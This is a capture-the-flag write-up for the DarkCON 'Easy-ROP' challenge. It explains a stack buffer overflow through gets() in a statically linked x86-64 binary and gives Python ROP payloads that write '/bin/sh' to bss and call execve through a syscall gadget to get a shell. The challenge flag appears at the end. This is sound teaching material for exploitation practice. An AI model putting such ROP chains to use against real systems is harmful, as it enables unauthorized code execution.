# [DarkCON CTF] Easy-ROP

## Info

+ 84 solves / 441 points

Welcome to the world of pwn!!! This should be a good entry level warmup challenge !! Enjoy getting the shell

## Summary

+ stack buffer overflow
+ ret2libc
+ ret2syscall

## File

+ Arch : x86-64
+ Library : statically linked

## Checksec

+ CANARY : Enabled
+ FORTIFY : Disabled
+ NX : Enabled
+ PIE : Disabled
+ RELRO : Partial

## Description

There is one simple function.

+ main

Stack buffer overflow occurs by gets()

## Exploit

**ROPgadget**

```python
syscall = 0x004012d3
prax = 0x004175eb
prdi = 0x0040191a
prsi = 0x0040f4be
prdx = 0x0047560e
```

There are lots of gadgets to control system call at given binary. Therefore, challenge can be solved easily if "/bin/sh" exists.

**Write binsh at bss**

```python
payload = b"A"*0x48
payload += p64(prdi)
payload += p64(bss)
payload += p64(gets)
p.sendline(payload)

payload = b"/bin/sh\x00"
p.sendline(payload)
```

We can get address of "/bin/sh" by writing it using gets().

**Call system("/bin/sh") using syscall gadget**

```python
payload += p64(prdi)
payload += p64(bss)
payload += p64(prsi)
payload += p64(0)
payload += p64(prdx)
payload += p64(0) + p64(0) + p64(0)
payload += p64(prax)
payload += p64(0x3b)
payload += p64(syscall)
p.sendline(payload)
```

Now we can get shell with syscall and binsh.

## Flag

+ darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}
